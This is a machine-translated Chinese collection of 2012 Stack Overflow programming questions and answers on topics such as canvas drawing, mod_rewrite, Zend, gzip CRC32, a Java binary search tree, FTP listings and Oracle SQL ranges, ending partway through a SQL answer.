所以如果你有一个图像“pic.png”，这应该是非视网膜的，“pic@2x.png”应该是视网膜尺度的。将其放置在storyboard/xib/UIImage 中时，您应该选择“pic.png”图像而不是@2x 图像。

如果需要，基于故事板的图像将自动选择视网膜图像。

# javascript - 如何在 WebGL、HTML5 或 CSS3 中为树算法绘制线条？

> ID：11553917
> 
> 赞同：0
> 
> 时间：2012-07-19T04:22:59.060
> 
> 标签：javascript, html, webgl

如何使用 WebGL、HTML5 或 CSS3 在画布上绘制特定颜色的线条。

我基本上是一个初学者，并从绘制树算法开始。我想绘制将父节点连接到其子节点的线。有人可以引导我朝着正确的方向前进。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:48:34.080

您很可能需要使用 Javascript 在画布上绘制线条。你可能想看看像[paper.js](http://paperjs.org/)这样的库，它提供了一个 API，使在画布上绘图变得更加容易。

如果你不想使用库，画布上的画线看起来像这样：

```
var drawingCanvas = document.getElementById('myDrawing');
// Check the element is in the DOM and the browser supports canvas
if(drawingCanvas.getContext) {
    // Initaliase a 2-dimensional drawing context
    var ctx = drawingCanvas.getContext('2d');
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(5*14,5);
    ctx.lineTo(5*14,140);
    ctx.stroke()
} 
```

# jquery - Datatables表格工具->仅显示记录是导出的csv文件？

> ID：11553918
> 
> 赞同：0
> 
> 时间：2012-07-19T04:23:09.403
> 
> 标签：jquery

我正在使用数据表，表格工具导出 csv 文件。它工作正常，但它的导出只显示表中的记录。但我想导出所有记录怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T06:38:36.900

```
$(document).ready(function() {
                /* Initialise the DataTable */
                var oTable = $('#example').dataTable( {
                    "sDom": 'T<"clear">lfrtip',
                    "oTableTools": {
                        "aButtons": [ {
                                "sExtends": "ajax",
                                "sButtonText": "CSV Export",
                                "fnClick": function( nButton, oConfig ) {
                                    var oParams = this.s.dt.oApi._fnAjaxParameters( this.s.dt );
                                    var iframe = document.createElement('iframe');
                                    iframe.style.height = "0px";
                                    iframe.style.width = "0px";
                                    iframe.src = "<?php echo base_url(); ?>/index.php/alarm/generate_csv"+"?"+$.param(oParams);
                                    document.body.appendChild( iframe );
                                }
                            } ]
                    )}; 
```

我试过这个它工作正常......无论如何谢谢大家

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T06:26:09.513

检查[这个](http://datatables.net/release-datatables/extras/TableTools/index.html)导出所有记录的例子。

# android - Android 文档中的“像素”术语

> ID：11553925
> 
> 赞同：0
> 
> 时间：2012-07-19T04:23:44.490
> 
> 标签：android

我知道 dip 是确定 android 大小的标准。因此，当文档说“像素”（例如在[本页](http://developer.android.com/reference/android/view/View.html)的位置部分）时，它的字面意思是像素还是与密度无关的像素？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:39:40.313

当然它只是像素，而不是 dp，但你总是可以这样转换它：

```
public static float convertDpToPixel(float dp,Context context){
    Resources resources = context.getResources();
    DisplayMetrics metrics = resources.getDisplayMetrics();
    float px = dp * (metrics.densityDpi/160f);
    return px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:41:02.090

所有这些像素单位都没有缩放。

# jsf-2 - JSF2.0 State_Saving_Method 客户端问题

> ID：11553933
> 
> 赞同：0
> 
> 时间：2012-07-19T04:24:47.800
> 
> 标签：jsf-2, primefaces, ejb-3.0, managed-bean, facade

我正在使用 Mojarra 2.1.3、Netbeans 7.0.1、primefaces 3.2。

我目前很纠结是使用 STATE_SAVING_METHOD 客户端还是服务器。目前我将保存方法设置为客户端。这涉及到我对许多对象的可串行性进行调整。并将瞬态关键字放在无状态外观会话 bean 上。

```
@ManagedBean
@ViewScoped
public class SaProductController implements Serializable {
@EJB
transient SaProductFacade saProductFacade;
@EJB
transient SaKeywordFacade saKeywordFacade;
.... 
```

我的 xhtml 页面有一个带有分页的 primefaces 数据表。第一次加载页面时，它通过在数据表中显示第一页来工作。但是，单击下一页时，此行会引发 NullPointerException 错误。

```
data = saProductFacade.selectAll(first, pageSize); 
```

这是为什么？是否因为 saProductFacade @EJB 属性声明为瞬态，并且在回发到同一页面时被销毁。无论如何，ViewScoped 托管 bean 仍然存在。请帮忙，如何解决这个问题？还是我做错了？

有关信息，如果我将 STATE_SAVING_METHOD 设置为服务器，这将非常有效。但是浏览器后退按钮的危险使我决定使用客户端状态保存选项。而且，服务器上的内存限制保证了客户端状态的保存。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T05:25:28.133

仅供参考，对于初学者，我现在使用服务器状态保存方法。如果用户按下后退按钮，我使用会话变量来记住我在哪里。这样，ViewScoped 支持 bean 被重新创建并自动分页到用户上次查看的页面。这样我就可以在用户使用 GET HTTP 请求导航到另一个页面之前将用户重定向到他们最后一个数据表页面所在的位置。

# mod-rewrite - 使用 HTTP_HOST 和不同端口的 RewriteRule

> ID：11553939
> 
> 赞同：8
> 
> 时间：2012-07-19T04:26:11.543
> 
> 标签：mod-rewrite

我需要在 RewriteRule 中使用 HTTP_HOST 标头，但更改我不能使用 SERVER_NAME 的端口，因为它将与主机标头不同（这是我需要的）

有没有办法为 mod_rewrite 修剪 HTTP_HOST 变量的 :port ？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-19T04:39:12.157

是的，您可以修剪主机头的端口。只需匹配`%{HTTP_HOST}`并使用`%1`反向引用。例如：

```
RewriteCond %{HTTP_HOST} ^([^:]+)(:[0-9]+)?$
RewriteRule ^ http://%1:12345/ [R,L] 
```

* * *

请记住，`%1`反向引用只能在 a 的第一个参数中使用`RewriteCond`，而不能在匹配中使用：

```
RewriteCond %{HTTP_HOST} ^([^:]+)(:[0-9]+)?$
RewriteCond %1 ^the.hostname.com$ [NC] 
```

没问题

```
RewriteCond %{HTTP_HOST} ^([^:]+)(:[0-9]+)?$
RewriteCond %{REQUEST_URI} ^%1 
```

不行

# php - 如何将 Zend Framework getResultRowObject 转换为数组

> ID：11553940
> 
> 赞同：4
> 
> 时间：2012-07-19T04:26:15.630
> 
> 标签：php, zend-framework

```
public function loginAction() {

   $auth = Zend_Auth::getInstance();    

   $DB = Zend_Db_Table_Abstract::getDefaultAdapter();
   $request=$this->getRequest();        

   $authAdapter = new Zend_Auth_Adapter_DbTable($DB);
   $authAdapter->setTableName('user')
               ->setIdentityColumn('uname')
               ->setCredentialColumn('password');  

   $uname = $request->getParam('uname');
   $pass = $request->getParam('password');

   $authAdapter->setIdentity($uname);
   $authAdapter->setCredential($pass);

   $result = $authAdapter->authenticate($authAdapter);
   $this->view->assign('auth',$result);
   if($result->isValid()) {

       $data = $authAdapter->getResultRowObject(null,'pass');
       $auth->getStorage()->write($data);

       //$this->view->assign('dbdata',$data);

       $userInfo = new Zend_Session_Namespace('userInfo');
       $userInfo->userType = 'admin';

       //$this->_redirect('/admin/adminhome');
   } else {

       $this->_redirect('/admin/index?fail=true');
   }    

   $data = $authAdapter->getResultRowObject(null,'pass'); 
```

这里`$data`将返回一个像这样的对象：

```
stdClass Object ( [id] => 12 [uname] => user [password] => user [type] => user ) 
```

我想将其转换为数组。只是尝试`toArray()`了功能，但徒劳无功。我的要求是像这样检查用户类型：

```
if($data['type']=='admin'){
do something
} else {
do something 
} 
```

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-19T04:48:50.677

要回答您的问题，请使用：

```
$data = $authAdapter->getResultRowObject(null,'pass');
$anArray = (array) $data; 
```

或者更简单地说：

```
$data = (array) $authAdapter->getResultRowObject(null,'pass'); 
```

但是您不需要转换为数组。直接使用对象即可：

```
$data = $authAdapter->getResultRowObject(null,'pass');
if($data->type=='admin'){
do something
} else{
do something 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-18T15:11:17.810

您可以使用[`get_object_vars()`](http://php.net/manual/en/function.get-object-vars.php)：

```
$array = get_object_vars($data); 
```

对于多维数组，您需要将其包装在 functon 中：

```
function toArray($data) {
  if (is_object($data)) {
    $data = get_object_vars($data);
  }
  if (is_array($data)) {
    return array_map(__FUNCTION__, $data);
  } else {
    return $d;
  }
} 
```

# linux - 使用gunzip计算一个字符串的crc32码

> ID：11553941
> 
> 赞同：2
> 
> 时间：2012-07-19T04:26:16.110
> 
> 标签：linux, crc32, gunzip

全部。

我想使用 gunzip 来计算字符串的 crc32 代码。

**字符串：**测试字符串

**此命令运行良好：**
`echo -n teststring | gzip -f > /tmp/filename && gunzip -lv /tmp/filename && rm -f /tmp/filename`

**但是这个命令不起作用：**
`echo -n teststring | gzip -f | gunzip -lv`

我搜索了所有 gunzip 手册，发现“如果压缩文件位于不可搜索的媒体上，--list 选项将大小报告为 -1，crc 报告为 ffffffff。”，我想知道为什么标准输出是不可搜索的媒体? 如何使这个命令运行良好？

**更新：**

这不起作用：
`cat /tmp/filename | gunzip -lv`

这很好用：
`gunzip -lv < /tmp/filename`

你能告诉我这两个命令之间的区别吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T08:42:21.413

当您通过管道传输时，接收可执行文件的输入根本不可搜索。因此，您遇到的问题。

相反，您可以提取倒数第​​二个字节，即 crc：

```
% echo -n teststring | gzip -1 | tail -c 8 | head -c 4 | hexdump -e '1/4 "%08x" "\n"'
1f58f83e 
```

或者您可以使用[pigz](http://zlib.net/pigz/)（碰巧不尝试寻找列表的 gzip 的并行版本）：

```
% echo -n teststring | gzip -1 | pigz -lv
method    check    timestamp    compressed   original reduced  name
gzip 8  1f58f83e  Jul 19 01:35          12         10  -20.0%  <stdin> 
```

一般来说，这是计算 crc 的一种相当低效的方法，因为 gzip 的压缩工作比计算 crc 的工作量要多得多。（我在`-1`上面添加了选项以最小化压缩工作，但它仍然更多。）您应该简单地编写一个简短的程序来计算 crc。您的 linux 机器几乎肯定有可用的 zlib 库。尝试包含`zlib.h`并使用`-lz`链接。您可以阅读`zlib.h`以了解如何使用该`crc32()`功能。

注释中建议的`cksum`命令可用于计算不同的 crc。如果你想要的只是任何 crc，那么你可以使用它。如果您想要 gzip、zip、png 等使用的 crc，则需要使用`crc32()`zlib 中的例程或等效程序。

# php - uploadify 不在 switch / if - else 语句中上传

> ID：11553942
> 
> 赞同：0
> 
> 时间：2012-07-19T04:26:24.080
> 
> 标签：php, jquery

我一直在使用 Uploadify 插件来上传文件。基本上，我需要上传不同类型的文件（照片、平面图、小册子）

所以，下面是我的上传代码（上传表单）

```
<? $sid = session_id();  ?>

$(document).ready(function() {
    $('#file_upload').uploadify({
        'uploader'  : 'js/uploadify214/uploadify.swf',
        'script'    : 'uploader.php?pid=<? echo $pid; ?>&type=<? echo $type; ?>',
        'scriptData': {'session': '<? echo $sid; ?>'},
        'multi': true, // enable multiple upload
        'queueSizeLimit': 5, // number of file at once
        'onQueueFull': function(event, queueSizeLimit) {
            alert("You can only upload " + queueSizeLimit + " files at once");
            return false;
        },
        'cancelImg' : 'js/uploadify214/cancel.png',
        'auto'      : false,
        'onAllComplete' : function(event,data) {
              window.location = "files.php?pid=<? echo $pid; ?>" // redirect to previous page
        }
    });
}); 
```

所有上传都将由**uploader.php**处理 ，下面是代码

```
session_id($_REQUEST['session']);
require_once('function.php');

$pid = $_REQUEST['pid'];
$type = $_REQUEST['type'];
$photo_file = $_FILES['Filedata'];
$photo_tags = 'test';
$status = '1';
$inuse = 0;

// the function will run if i put it here
property_photo_upload($user_id, $pid, $photo_file, $photo_tags, $inuse, 'photo');

// but if i put it in switch / if-else statement, the code will not run
switch($type){
    case 'photo' :
        property_photo_upload($user_id, $pid, $photo_file, $photo_tags, $inuse, 'photo');
        break;

    case 'floorplan' :
        property_doc_upload($user_id, $pid, $photo_file, $photo_tags, $inuse, 'floorplan');
        break;

    case 'brochure' :
        property_doc_upload($user_id, $pid, $photo_file, $photo_tags, $inuse, 'brochure');
        break;
} 
```

所以，问题是如果我把上传功能放在外面/没有 switch/if-else 语句，上传进度可以毫无问题地运行。但是当我将函数放在 switch / if-else 语句中时，突然上传不起作用。

我需要 switch 语句，以便我的代码可以处理不同文件类型的上传。

非常感谢任何帮助。对不起我的英语不好和很长的问题。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:39:25.377

主要原因是$type的变量。

什么类型的 $type ？

调用 var_dump 的函数

# java - 创建二叉搜索树

> ID：11553944
> 
> 赞同：1
> 
> 时间：2012-07-19T04:26:24.750
> 
> 标签：java, tree, binary-tree, binary-search-tree

好的，所以我目前正在尝试创建一个二叉搜索树，每个节点都包含对某个对象的引用，以及对其左子节点的引用和对其右子节点的引用（总共 3 个变量）。左孩子必须总是比它的父母小，而右孩子总是必须比它的父母大。我必须创建两个方法：1 方法 ( contains()) 检查元素是否在树中，以及 add() 方法将元素添加到树中的适当位置。

这是 BinarySearchTree 类：

```
public class BinarySearchTree extends BinaryTree {

public BinarySearchTree(TreeNode t){
    super(t);
}

public boolean contains (Comparable obj){
    if (this.myRoot != null){
        return containshelper(obj, this.myRoot);
    }
    return false;

}

public static boolean containshelper(Comparable comp, TreeNode t){
    boolean flag = true;
    int x = comp.compareTo(t.myItem);
    if (x < 0 && t.myLeft != null){
        containshelper(comp,t.myLeft);
    }
    if (x > 0 && t.myRight != null){
        containshelper(comp,t.myRight);
    }
    if (x == 0){
        return true;
    }
    return false;
}

public void add(Comparable key) {
    if (!this.contains(key)){
        if (this.myRoot != null){
            add(myRoot, key);
        }
        System.out.print("Getting Here ");
    }
    else {
        System.out.print("Tree already contains item");
    }
}

private static TreeNode add(TreeNode t, Comparable key) {

    if (((Comparable) t.myItem).compareTo(key) < 0 && t.myLeft != null){
        add(t.myLeft,key);

    }
    if(((Comparable) t.myItem).compareTo(key) > 0 && t.myRight != null ) {
        add(t.myRight,key);

    }
    if (((Comparable) t.myItem).compareTo(key) < 0 && t.myLeft == null){
        TreeNode q = new TreeNode(key);
        t.myLeft = q;

    }
    if (((Comparable) t.myItem).compareTo(key) > 0 && t.myRight == null ){
        TreeNode w = new TreeNode(key);
        t.myRight = w;

    }
    return t;
}
} 
```

这是 TreeNode 类（包含在 BinaryTree 中）：

```
 public static class TreeNode {

    public Object myItem;
    public TreeNode myLeft;
    public TreeNode myRight;
    public int size;

    public TreeNode (Object obj) {
        size = size(this);
        myItem = obj;
        myLeft = myRight = null;
    }
    public int size(TreeNode t) { 
        return(sizehelper(t)); 
    }
    private int sizehelper(TreeNode node) { 
        if (node == null){ 
            return(0); 
        }
        else { 
            return(size(node.myLeft) + 1 + size(node.myRight)); 
        } 
    }

    public TreeNode (Object obj, TreeNode left, TreeNode right) {
        myItem = obj;
        myLeft = left;
        myRight = right;
    }
}
} 
```

我很确定我的 contains() 方法有效，但是对于我的一生，我无法弄清楚为什么 add() 不起作用。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:41:12.893

你有一些错误`containsHelper`

```
public static boolean containshelper(Comparable comp, TreeNode t){

    // TreeNode.myItem should be declared of type `Comparable` instead of `Object`
    int x = comp.compareTo(t.myItem);
    if (x < 0 && t.myLeft != null){
        return containshelper(comp,t.myLeft); // where does result of this call go? We must return the result !!
    }
    if (x > 0 && t.myRight != null){
        return containshelper(comp,t.myRight); // this too ?
    }
    if (x == 0){
        return true;
    }
    return false;
} 
```

这里也有同样的错误：

```
private static TreeNode add(TreeNode t, Comparable key) {

if (t.myItem.compareTo(key) < 0 && t.myLeft != null){
    t = add(t.myLeft,key); // where does returned result go?
}
else if (t.myItem.compareTo(key) > 0 && t.myRight != null ) {
    t = add(t.myRight,key);
}
else if (t.myItem.compareTo(key) < 0 && t.myLeft == null){
    TreeNode q = new TreeNode(key);
    t.myLeft = q;
}
else if (t.myItem.compareTo(key) > 0 && t.myRight == null ){
    TreeNode w = new TreeNode(key);
    t.myRight = w;
}
return t;
} 
```

您应该声明`TreeNode.myItem`type `Comparable`，以强制每个想要适合您的二进制搜索的类提供`compareTo`方法。这比将对象转换为 更好`Comparable`，因为对象可能未实现`Comparable`，然后会导致运行时错误

# asp.net - 如何将 ASP.NET 网络服务部署到 IIS 7？

> ID：11553952
> 
> 赞同：7
> 
> 时间：2012-07-19T04:27:19.483
> 
> 标签：asp.net, web-services, iis-7, msdeploy

如何将 ASP.NET Web 服务部署到 IIS 7？

我已将我的 Web 服务部署到安装在 Windows Server 2008 上的 IIS-5。但是，我并不精通 IIS-7 中的配置选项。

对于 IIS-5，我遵循以下步骤。

1.  在 IIS 中创建新的虚拟目录
2.  在 Visual Studio 中打开 Web 服务
3.  去建造
4.  发布网站
5.  发布到本地 IIS
6.  选择在步骤 1 中创建的相同虚拟目录

由于这些步骤不起作用，IIS-7 的步骤是什么？我收到错误 404。我尝试`Default Document`将`.asmx`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-10-06T15:02:28.863

1.  在 VS 中重建项目
2.  将项目文件夹复制到 iis 文件夹，可能是 C:\inetpub\wwwroot\
3.  在 iis 管理器 (run>inetmgr) 添加网站，指向文件夹，根据您的 .net 指向应用程序池
4.  将 web 服务添加到创建的网站，与 3 几乎相同。
5.  为 windows 7 和 .net 4.0 安装 ASP：c:\windows\microsoft.net framework\v4.(一些数字)\regiis.exe -i
6.  在浏览器上检查对 Web 服务的访问

# linux - FTP "ls -lt" 命令：它如何列出 Linux FTP 和 Windows FTP 服务器的文件详细信息？

> ID：11553953
> 
> 赞同：9
> 
> 时间：2012-07-19T04:27:26.777
> 
> 标签：linux, ftp, ftp-client, ftpwebrequest, ftp-server

我正在编写至少应该适用于 Windows 和 Linux FTP 的 FTP 客户端。但在我继续之前，我想回答这些问题。

1.  **Linux**`ls -lt`上的 FTP 服务器使用FTP 命令时，文件的排列顺序是什么？
***   是否有**所有 Linux FTP 服务器都**提供文件列表的特定格式/逻辑？例如，日期时间戳将始终存在，并且文件按“修改日期”或类似内容的降序排列。*   **Windows**`ls -lt`上的 FTP 服务器使用FTP 命令时，文件的排列顺序是怎样的？***   是否有**所有 Windows FTP 服务器都**提供文件列表的特定格式/逻辑？*   你能指导我看一些有助于理解这一点的文档吗？有没有为此定义的标准？****

 ****注意：我在 Windows 和 Linux FTP 服务器上尝试了命令，但我无法弄清楚任何特定的逻辑/格式。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-19T04:59:38.647

`ls`是客户端命令。当您的客户端`ls -lt`从用户那里获取信息时，您向服务器发出`LIST`命令，由您的客户端解析返回的数据并按时间排序。使用该`LIST`命令时 ftp 服务器返回的数据与 的输出类似`ls`，但可能因服务器而异。见：[http ://cr.yp.to/ftp/list.html](http://cr.yp.to/ftp/list.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-19T04:51:06.010

FTP ls / dir 命令的格式取决于服务器实现。您不太可能依赖 ftp 中的 ls -lt 命令的顺序。一些服务器实现可能会给你名字顺序，其他的可能会给你时间顺序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-18T02:29:33.333

较新的 FTP 服务器应该有望实现 RFC 3659，尤其是[MLSD 和 MLST](https://www.rfc-editor.org/rfc/rfc3659#section-7)命令。这些命令的响应格式——用于以机器可解析的格式列出文件和目录——由 RFC 严格定义，因此在底层平台/操作系统之间应该是相同的。

不幸的是，MLSD/MLST 命令在处理响应格式时，不能保证列表中文件的顺序；这是您的客户需要处理的事情。****

# android - android 中没有 OAuth 的 twitter

> ID：11553957
> 
> 赞同：0
> 
> 时间：2012-07-19T04:27:48.113
> 
> 标签：android, twitter, twitter-oauth, twitter4j, jtwitter

任何人都知道如何直接使用 twitter 而不要求凭据而不使用 OAuth 库？

我想把凭证直接放在代码中并授权应用程序，然后只看到主页时间线。

我尝试使用 jTwitter 库，但是当我使用 getHomeTimeline 方法时，它会抛出错误“错误请求”。

这是我的代码示例：

```
try {

    winterwell.jtwitter.Twitter tw = new winterwell.jtwitter.Twitter("UserName","Password");
    List<winterwell.jtwitter.Twitter.Status> ls = tw.getHomeTimeline();

    for (winterwell.jtwitter.Twitter.Status status : ls) {
         System.out.println("@" + status.getUser().getScreenName() + " - " + status.getText());
    }

} 

catch (TwitterException e) {
    e.printStackTrace();
    System.out.println("Failed to get timeline: " + e.getMessage());
} 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T16:46:45.140

你可以这样做，但这不是很方便。它将始终检索同一用户的主时间线（将其令牌直接写入代码的用户）。因此，您必须为应用程序的每个用户编译一个不同的应用程序，因为**每个**用户的 OAuth 令牌和 OAuth 密钥都不同。如果您是该应用程序的唯一用户，则不会有任何问题，但如果其他用户使用它，则不方便

但是，您不会避免通过身份验证过程来获取用户的令牌。

# php - 使用 nginx 和 jquery/ajax 上传 POST 图像

> ID：11553960
> 
> 赞同：0
> 
> 时间：2012-07-19T04:28:20.343
> 
> 标签：php, jquery, nginx

我有我的表格：

```
<form id="upload" method="POST" enctype="multipart/form-data"  action="#">
    <input id="file" name="file" type="file"/>
    <button type="submit" id="btn">Upload</button>
</form> 
```

和我的 jquery 来处理表单并将其发送出去。

```
$('form#upload').live('submit', function(e) {
    e.preventDefault();

    var filename = $("#file").val();

    $.ajax({
            type: "POST", url: "http://www.domain.com/upload/", 
            dataType: "html",
            enctype: 'multipart/form-data',
            data: {file: filename},
            success: function(responseData, textStatus, jqXHR) {
                var value = responseData;
                alert(value);
            },
            error: function (responseData, textStatus, errorThrown) {
                alert('POST failed.');
            }
    });

    return false;

}); 
```

现在 www.domain.com/upload/ 使用 nginx 设置，以便它拦截上传尝试并处理它——而不是例如，php 处理它。

阅读更多相关信息：[http ://blog.martinfjordvald.com/2010/08/file-uploading-with-php-and-nginx/](http://blog.martinfjordvald.com/2010/08/file-uploading-with-php-and-nginx/)

它不断返回 POST 失败。特别是在我的控制台中，我看到了 400 BAD REQUEST 或 405。

有什么想法吗？

# ios - 无法让标签在 Facebook iOS SDK 3.0 中工作

> ID：11553961
> 
> 赞同：0
> 
> 时间：2012-07-19T04:28:21.677
> 
> 标签：ios, facebook, sdk

我已经简化了在这里发布的代码，但基本上我正在这样做：

```
id<SCOGMyAction> action = (id<SCOGMyAction>)[FBGraphObject graphObject];
action.user_message = @"My Message";
action.place = selectedPlace; <-- FBGraphPlace
action.tags = selectedFriends; <-- NSArray of FBGraphUser
[FBRequest startForPostWithGraphPath:@"me/ns:action" graphObject:action completionHandler:
    ^(FBRequestConnection *connection, id result, NSError *error) { }]; 
```

我可以发布 user_message 并将其放置好，但是当我尝试发布标签时出现 500 服务器错误。我正在使用 FBFriendPickerViewController 来挑选朋友，当我将其分配给“标签”时，我确保朋友存在。

我从 Scrumptious 示例中获取了代码。有其他人在这方面取得成功吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T03:20:40.143

我想通了，以防其他人有同样的问题。

使用 Graph API Explorer 时，我收到以下错误：“这些用户无法被您的应用标记：xxxxxx。他们不是您的应用的开发者，或者您的操作未获批准标记。”

所以我想我需要弄清楚如何设置一个可以接收标签的测试开发者帐户？如果有人知道怎么做，请告诉我:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:19:11.947

转到您的 Facebook 应用设置：[https ://developers.facebook.com/apps](https://developers.facebook.com/apps)

然后编辑设置>角色

然后，您可以添加要用于测试标签的朋友。将它们添加到管理员、开发人员或测试人员角色下。这些朋友/用户将收到通知，并且必须先接受您添加他们的请求，然后才能标记他们。

# php - 如何使用 Jquery ajax 访问 php Web 服务

> ID：11553970
> 
> 赞同：1
> 
> 时间：2012-07-19T04:30:04.383
> 
> 标签：php, ajax, json, cordova

我有一个登录网络服务，我正在尝试使用 Jquery Ajax 访问。但我无法访问。我使用了很多方法，但没有成功。请帮我

1.  使用 getJSON

    ```
    $("#login").click(function () {
        var url = 'http://localhost:8080/vrm/web_services/login?data=[{"email":"gaurav.gautam@mailinator.com","password":"123456","device_token":"GLKOS58GDG549853JSFJSBMSMSG"}]';
        jQuery.getJSON(url+"&callback=?", function(data) {
        alert("Success" + data.id);
    }); 
    ```

2.  使用 .ajax()

    ```
    var markers = [{ "email": "gaurav.gautam@mailinator.com", "password": "123456","device_token":"GLKOS58GDG549853JSFJSBMSMSG" }]
    $.ajax( {
      //  url: 'http://localhost:8080/vrm/web_services/login?data=[{"email":"gaurav.gautam@mailinator.com","password":"123456","device_token":"GLKOS58GDG549853JSFJSBMSMSG"}]',
      uri:'http://localhost:8080/vrm/web_services/login',
      type: "GET",
        contentType: "application/json; charset=utf-8",
        dataType: "jsonp",
        data:  JSON.stringify({ data: markers }),
        processdata:true,
        jsonpCallback: 'mycallback',
        success : function(data) {

           var json = $.parseJSON(data);
           $('#items').html(json);
           alert(json);

        },
        error : function(req, status, ex) {

          alert("Lol" + ex);

        }
        }); 
    ```

我也使用了 dataType: "json" 但没有得到 request.status 0 并且当使用 dataType: "jsonp" 得到错误 'invalid label'

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:59:48.860

ajax不允许跨域..

我有 1 种方法来解决这个问题：

用js创建了一个脚本标签，像这样：

```
var sc=document.createElement('script');
var url="http://localhost:8080/vrm/web_services/login?data=[{"email":"gaurav.gautam@mailinator.com","password":"123456","device_token":"GLKOS58GDG549853JSFJSBMSMSG"}]";
sc.setAttribute('src',url);
document.body.appendChild(src); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:45:54.787

一方面，如果你指定 dataType: "json" 那么你就不需要`$.parseJSON(data)`调用，jQuery 会自动解析 JSON 并`data`成为一个 JavaScript 对象（当然，成功时）。

我建议在 Firefox 或 Safari 或 Chrome 的开发工具中使用 Firebug（在 Safari 中，转到首选项，高级，选中“在菜单栏中显示开发菜单”。然后开发菜单 -> 显示错误控制台）。然后，您可以插入日志语句，例如`console.log(data)`查看返回的内容，或查找控制台中打印的错误。您还可以转到开发人员检查器中的网络选项卡以查看通过网络发送的内容。这应该可以帮助您缩小问题的范围。

# java - Java Attach API：VirtualMachine.list() 返回空列表？

> ID：11553971
> 
> 赞同：4
> 
> 时间：2012-07-19T04:30:14.547
> 
> 标签：java, api

每当我使用 Java Attach API 时，都不会返回有效的 VirtualMachines。我已经尝试遍历 VirtualMachine.list() 返回的列表，并且任何时候我认为我已经获得了进程 ID，我尝试使用 VirtualMachine.attach() 它给了我一个 NullPointerException 因为 attach() 方法它本身从不初始化它试图抛出的异常。我正在通过 Eclipse 处理该项目，应用程序本身的 Windows 进程在运行时是 javaw.exe。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-30T12:33:43.180

当我使用 JRE 中的 java.exe 而不是 JDK 中的 java.exe 时，我遇到了类似的问题。

通过 eclipse 执行的应用程序运行良好，并且通过 VirtualMachine.list() 正确检测到所有 VM，但是当我尝试使用 JRE 中的 java.exe 执行独立应用程序时，没有检测到 VM。然后我注意到我在 Eclipse 中使用了 JDK，所以我将独立应用程序中的 java.exe 从 JDK 更改为 java，并且一切正常。

将 Eclipse 项目的 Runtime JRE 更改为 JDK，然后重试。这可能会解决您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-02-10T23:49:45.637

发现 VM 的代码在 Java 8 的 tools.jar 中。这就是为什么需要从 JDK 运行的原因。

使用模块化 Java，您需要“jdk.attach”模块，您可以使用 jlink 将其添加到 JRE。

# sql - 我应该使用哪个函数来解决

> ID：11553974
> 
> 赞同：-2
> 
> 时间：2012-07-19T04:30:29.087
> 
> 标签：sql, oracle, oracle10g

假设我有一个下面给出的范围

```
400001 - 400104
400601 - 400614
400701 - 400710
401101
401104
401105
401107
401201
401202
401203
401207
401209
401301
401303
421001 - 421005
421201
421202
421203
421204
421301
421304
421306 
```

而且我必须在下面给定的范围内找到数据，而不是告诉我最简单的方法。我在函数中使用并解决它，但如果有更多的范围会变得更加乏味

```
IN
          (400001, 400002, 400003, 400004, 400005, 400006, 400007, 400008,
           400009, 400010, 400011, 400012, 400013, 400014, 400015, 400016,
           400017, 400018, 400019, 400020, 400021, 400022, 400023, 400024,
           400025, 400026, 400027, 400028, 400029, 400030, 400031, 400032,
           400033, 400034, 400035, 400036, 400037, 400038, 400039, 400040,
           400041, 400042, 400043, 400044, 400045, 400046, 400047, 400048,
           400049, 400050, 400051, 400052, 400053, 400054, 400055, 400056,
           400057, 400058, 400059, 400060, 400061, 400062, 400063, 400064,
           400065, 400066, 400067, 400068, 400069, 400070, 400071, 400072,
           400073, 400074, 400075, 400076, 400077, 400078, 400079, 400080,
           400081, 400082, 400083, 400084, 400085, 400086, 400087, 400088,
           400089, 400090, 400091, 400092, 400093, 400094, 400095, 400096,
           400097, 400098, 400099, 400100, 400101, 400102, 400103, 400104,
           400601, 400602, 400603, 400604, 400605, 400606, 400607, 400608,
           400609, 400610, 400611, 400612, 400613, 400614, 400701, 400702,
           400703, 400704, 400705, 400706, 400707, 400708, 400709, 400710,
           401101, 401104, 401105, 401107, 401201, 401202, 401203, 401207,
           401209, 401301, 401303, 421001, 421002, 421003, 421004, 421005,
           421201, 421202, 421203, 421204, 421301, 421304, 421306) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T09:38:29.980

除了乏味之外，`in`还有 1000 个值的限制，如果您的范围很大，您可能会达到这个值。

如果您可以将 Excel 数据转换为可以生成文本以形成 CTE 的格式，您可能可以使用公式执行此操作，您可以执行以下操作：

```
with tmp_tab as (
    select 400001 as range_from, 400104 as range_to from dual
    union all select 400601, 400614 from dual
    union all select 400701, 400710 from dual
    union all select 401101, null from dual
    union all select 401104, null from dual
    union all select 401105, null from dual
    union all select 401107, null from dual
    union all select 401201, null from dual
    union all select 401202, null from dual
    union all select 401203, null from dual
    union all select 401207, null from dual
    union all select 401209, null from dual
    union all select 401301, null from dual
